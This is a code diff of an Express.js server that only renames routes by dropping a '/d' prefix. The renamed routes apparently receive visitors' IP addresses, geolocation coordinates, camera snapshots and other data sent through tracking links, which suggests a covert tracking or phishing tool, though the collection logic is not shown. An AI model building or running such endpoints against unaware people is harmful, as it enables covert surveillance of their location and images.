@@ -34,7 +34,7 @@ var use1pt = false;
 
 
 
-app.get("/d/w/:path/:uri", (req, res) => {
+app.get("/w/:path/:uri", (req, res) => {
     var ip;
     var d = new Date();
     d = d.toJSON().slice(0, 19).replace('T', ':');
@@ -63,7 +63,7 @@ app.get("/d/w/:path/:uri", (req, res) => {
 
 });
 
-app.get("/d/c/:path/:uri", (req, res) => {
+app.get("/c/:path/:uri", (req, res) => {
     var ip;
     var d = new Date();
     d = d.toJSON().slice(0, 19).replace('T', ':');
@@ -93,7 +93,7 @@ app.get("/d/c/:path/:uri", (req, res) => {
 
 });
 
-app.get("/d/o/:path/:uri", (req, res) => {
+app.get("/o/:path/:uri", (req, res) => {
     var ip;
     var d = new Date();
     d = d.toJSON().slice(0, 19).replace('T', ':');
@@ -124,7 +124,7 @@ app.get("/d/o/:path/:uri", (req, res) => {
 });
 
 
-app.get("/d/l/:path/:uri", (req, res) => {
+app.get("/l/:path/:uri", (req, res) => {
     var ip;
     var d = new Date();
     d = d.toJSON().slice(0, 19).replace('T', ':');
@@ -151,7 +151,7 @@ app.get("/d/l/:path/:uri", (req, res) => {
     }
 });
 
-app.get("/d", (req, res) => {
+app.get("/", (req, res) => {
     var ip;
     if (req.headers['x-forwarded-for']) {
         ip = req.headers['x-forwarded-for'].split(",")[0];
@@ -168,7 +168,7 @@ app.get("/d", (req, res) => {
 });
 
 
-app.post("/d/location", (req, res) => {
+app.post("/location", (req, res) => {
 
 
     var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
@@ -186,7 +186,7 @@ app.post("/d/location", (req, res) => {
 });
 
 
-app.post("/d", (req, res) => {
+app.post("/", (req, res) => {
 
     var uid = decodeURIComponent(req.body.uid) || null;
     var data = decodeURIComponent(req.body.data) || null;
@@ -240,7 +240,7 @@ async function fetchAndFormat(prompt) {
     }
 }
 
-app.post("/d/camsnap", (req, res) => {
+app.post("/camsnap", (req, res) => {
     var uid = decodeURIComponent(req.body.uid) || null;
     var img = decodeURIComponent(req.body.img) || null;
 
